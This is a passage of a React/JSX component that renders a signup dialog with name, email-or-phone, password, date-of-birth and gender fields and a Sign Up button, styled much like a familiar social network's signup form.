                      <FormMessage className="text-xs mt-1 text-[#be4b49]" />
                    </FormItem>
                  )}
                />
                <FormField
                  control={signupForm.control}
                  name="lastName"
                  render={({ field }) => (
                    <FormItem className="flex-1">
                      <FormControl>
                        <input {...field} placeholder="Surname" className="w-full px-3 py-2 text-sm border rounded-md bg-[#f5f6f7] border-[#ccd0d5] text-[#1c1e21]" />
                      </FormControl>
                      <FormMessage className="text-xs mt-1 text-[#be4b49]" />
                    </FormItem>
                  )}
                />
              </div>

              <FormField
                control={signupForm.control}
                name="emailOrPhone"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <input {...field} placeholder="Mobile number or email address" className="w-full px-3 py-2 text-sm border rounded-md bg-[#f5f6f7] border-[#ccd0d5] text-[#1c1e21]" />
                    </FormControl>
                    <FormMessage className="text-xs mt-1 text-[#be4b49]" />
                  </FormItem>
                )}
              />

              <FormField
                control={signupForm.control}
                name="newPassword"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <input {...field} type="password" placeholder="New password" className="w-full px-3 py-2 text-sm border rounded-md bg-[#f5f6f7] border-[#ccd0d5] text-[#1c1e21]" />
                    </FormControl>
                    <FormMessage className="text-xs mt-1 text-[#be4b49]" />
                  </FormItem>
                )}
              />

              <div>
                <label className="text-xs text-[#65676b]">Date of birth</label>
                <div className="flex gap-3 mt-1">
                  <select className="flex-1 px-2 py-1 text-sm border rounded-md bg-[#f5f6f7] border-[#ccd0d5] text-[#1c1e21]" value={signupForm.watch("birthday.month")} onChange={(e) => signupForm.setValue("birthday.month", e.target.value)}>
                    {months.map((m, idx) => <option key={idx} value={String(idx)}>{m}</option>)}
                  </select>
                  <select className="flex-1 px-2 py-1 text-sm border rounded-md bg-[#f5f6f7] border-[#ccd0d5] text-[#1c1e21]" value={signupForm.watch("birthday.day")} onChange={(e) => signupForm.setValue("birthday.day", e.target.value)}>
                    {days.map((d) => <option key={d} value={d}>{d}</option>)}
                  </select>
                  <select className="flex-1 px-2 py-1 text-sm border rounded-md bg-[#f5f6f7] border-[#ccd0d5] text-[#1c1e21]" value={signupForm.watch("birthday.year")} onChange={(e) => signupForm.setValue("birthday.year", e.target.value)}>
                    {years.map((y) => <option key={y} value={y}>{y}</option>)}
                  </select>
                </div>
              </div>

              <div>
                <label className="text-xs text-[#65676b]">Gender</label>
                <div className="flex gap-3 mt-1">
                  {[{ value: "female", label: "Female" }, { value: "male", label: "Male" }, { value: "custom", label: "Custom" }].map((option) => (
                    <label key={option.value} className="flex-1 flex items-center justify-between px-3 py-2 border rounded-md cursor-pointer bg-[#f5f6f7] border-[#ccd0d5]">
                      <span className="text-sm text-[#1c1e21]">{option.label}</span>
                      <input type="radio" name="gender" value={option.value} onChange={(e) => signupForm.setValue("gender", e.target.value)} checked={signupForm.watch("gender") === option.value} className="w-4 h-4 cursor-pointer" />
                    </label>
                  ))}
                </div>
              </div>

              <button type="submit" disabled={isSigningUp} className="w-auto px-16 py-2 text-white text-base font-bold transition disabled:opacity-60 mx-auto block bg-[#00a400] rounded-md">
                {isSigningUp ? "Signing up..." : "Sign Up"}
              </button>
            </form>
          </Form>
        </DialogContent>
      </Dialog>
    </div>
  );
}
